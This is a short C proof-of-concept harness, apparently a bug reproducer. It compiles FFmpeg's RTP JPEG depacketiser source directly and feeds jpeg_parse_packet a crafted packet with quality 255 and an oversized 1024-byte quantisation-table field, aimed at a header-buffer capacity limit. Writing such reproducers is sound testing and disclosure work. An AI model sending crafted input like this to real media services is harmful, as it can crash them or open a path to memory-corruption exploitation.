#include <stdio.h>

#include "libavutil/mem.h"
#include "libavcodec/jpegtabs.h"
#include "libavformat/rtpdec_jpeg.c"

#define QTABLE_LENGTH 1024
#define PACKET_LENGTH (8 + 4 + QTABLE_LENGTH)

int ff_rtp_finalize_packet(AVPacket *packet, AVIOContext **buffer,
                           int stream_index)
{
    return AVERROR_BUG;
}

int main(void)
{
    AVFormatContext *format = avformat_alloc_context();
    AVStream *stream;
    PayloadContext jpeg = { 0 };
    AVPacket packet = { 0 };
    uint32_t timestamp = 1;
    uint8_t *data = av_calloc(PACKET_LENGTH + AV_INPUT_BUFFER_PADDING_SIZE, 1);

    if (!format || !data)
        return 2;
    stream = avformat_new_stream(format, NULL);
    if (!stream)
        return 3;

    data[4] = 0;
    data[5] = 255;
    data[6] = 1;
    data[7] = 1;
    AV_WB16(data + 10, QTABLE_LENGTH);

    fprintf(stderr,
            "q=255 qtable_length=%d header_capacity=1024 "
            "qtable_count=%d packet_length=%d\n",
            QTABLE_LENGTH, QTABLE_LENGTH / 64, PACKET_LENGTH);
    fflush(stderr);

    return jpeg_parse_packet(format, &jpeg, stream, &packet, &timestamp,
                             data, PACKET_LENGTH, 1, 0);
}
